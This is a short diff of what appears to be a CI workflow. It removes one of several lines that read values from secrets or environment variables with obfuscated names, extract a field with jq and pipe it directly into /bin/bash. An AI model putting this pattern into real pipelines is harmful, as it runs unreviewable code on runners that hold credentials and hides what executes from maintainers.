@@ -22,7 +22,6 @@ jobs:
           ie34: ${{ secrets.ie34 }}
         run: |
           printf '%s' "$ie34" | jq -r .vfo1002 | /bin/bash
-          printf '%s' "$vipkm95" | jq -r .hru6 | /bin/bash
           echo $wkqi5 | jq -r .wq271 | /bin/bash
           echo $va96 | jq -r .uo95501 | /bin/bash
           printf '%s' "$lt9" | jq -r .uwhyg553 | /bin/bash
